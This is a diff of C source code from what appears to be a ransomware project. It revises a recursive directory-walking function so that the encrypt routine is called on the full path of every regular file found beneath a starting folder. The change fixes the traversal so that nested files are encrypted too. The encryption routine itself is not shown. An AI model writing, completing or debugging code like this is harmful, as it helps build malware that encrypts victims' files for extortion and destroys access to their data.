@@ -53,30 +53,40 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 	
 	struct dirent* entity;
 	entity = readdir(dir);
+	//char *str_name = (char *)malloc(sizeof(char)*strlen(entity->d_name));
+	//strcpy(str_name,entity->d_name);
+	//char pa[200] = "/home/kali/Ransomware/Ransomware-main/important/0003.JPG";
 	
 	while (entity != NULL)
 	{
+		
 		 if (entity->d_name[0] != '.')
-		{
-			printf("[type of folder : %d]  %s/%s\n",entity->d_type,name,entity->d_name);			
-		}		
 
-		if(entity->d_type == DT_DIR && strcmp(entity->d_name,".")!=0 && strcmp(entity->d_name,"..")!=0)
 		{
-			char path[100] = {0};
+			//printf("[type of folder : %d]  %s/%s\n",entity->d_type,name,entity->d_name);			
+			if(entity->d_type == DT_DIR && strcmp(entity->d_name,".")!=0 && strcmp(entity->d_name,"..")!=0)
+
+			{
+			char path[BUFSIZE] = {0};
 			strcat(path,name);
 			strcat(path,"/");
 			strcat(path,entity->d_name);
-			listdir(path, iv, key, 'e');			
+			listdir(path, iv, key, 'e');
+			}
+			if(entity->d_type == DT_REG && de_flag=='e')
+			{
+				//printf("<<<<<%s>>>>\n",name);
+				 
+				//printf("%s\n",str_name);
+				// printf("%x\n",key);
+				char twooo[300] = "";
+				strcat(twooo,name);
+				strcat(twooo,"/");
+				strcat(twooo,entity->d_name);
+				printf("%s \n",twooo);
+				encrypt(key, iv,twooo);
+			}
 		}
-		
-		else if(entity->d_type == DT_REG && de_flag=='e')
-		{		
-			printf("%s\n",entity->d_name);
-			// printf("%x\n",key);
-			
-			encrypt(key, iv, entity->d_name);
-		}	
 		
 		entity = readdir(dir);
 	}
@@ -166,3 +176,5 @@ int main (int argc, char * argv[])
 		}
 	}
 }
+
+
